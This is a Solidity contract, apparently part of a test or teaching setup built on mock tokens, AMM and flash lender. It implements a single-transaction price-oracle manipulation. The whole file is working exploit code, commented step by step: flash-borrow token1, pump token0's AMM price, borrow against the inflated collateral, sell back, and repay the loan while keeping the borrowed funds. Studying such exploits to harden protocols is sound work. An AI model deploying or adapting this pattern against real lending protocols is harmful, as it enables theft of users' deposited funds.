// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {MockERC20} from "./MockERC20.sol";
import {SimpleAMM} from "./SimpleAMM.sol";
import {IFlashBorrower, MockFlashLender} from "./MockFlashLender.sol";

interface ILending {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

/// @notice Single-transaction oracle manipulation:
///   1. flash-borrow token1 and buy token0 from the AMM (pumps token0's price)
///   2. borrow against the now-inflated collateral value
///   3. sell the token0 back (restores the AMM price)
///   4. repay the flash loan. The borrowed token1 is kept.
contract OracleAttacker is IFlashBorrower {
    SimpleAMM public immutable amm;
    ILending public immutable lending;
    MockFlashLender public immutable lender;
    MockERC20 public immutable token0;
    MockERC20 public immutable token1;

    constructor(address _amm, address _lending, address _lender) {
        amm = SimpleAMM(_amm);
        lending = ILending(_lending);
        lender = MockFlashLender(_lender);
        token0 = amm.token0();
        token1 = amm.token1();

        token0.approve(_amm, type(uint256).max);
        token1.approve(_amm, type(uint256).max);
        token0.approve(_lending, type(uint256).max);
    }

    /// @notice Post collateral at the honest, pre-attack price.
    function depositCollateral(uint256 amount) external {
        lending.depositCollateral(amount);
    }

    /// @notice Run the attack. Needs a small token1 buffer to cover the round-trip AMM fee.
    function attack(uint256 flashAmount, uint256 borrowAmount) external {
        lender.flashLoan(address(this), flashAmount, abi.encode(borrowAmount));
    }

    function onFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == address(lender), "not lender");
        uint256 borrowAmount = abi.decode(data, (uint256));

        // 1) PUMP: buy token0 with borrowed token1. token0 gets scarcer, so its price in token1 rises.
        uint256 bought = amm.swap1For0(amount, 0);

        // 2) BORROW against the inflated collateral value
        lending.borrow(borrowAmount);

        // 3) DUMP: sell the token0 back, restoring the AMM price
        amm.swap0For1(bought, 0);

        // 4) REPAY the flash loan. The borrowed token1 stays with the attacker.
        token1.transfer(address(lender), amount);
    }
}
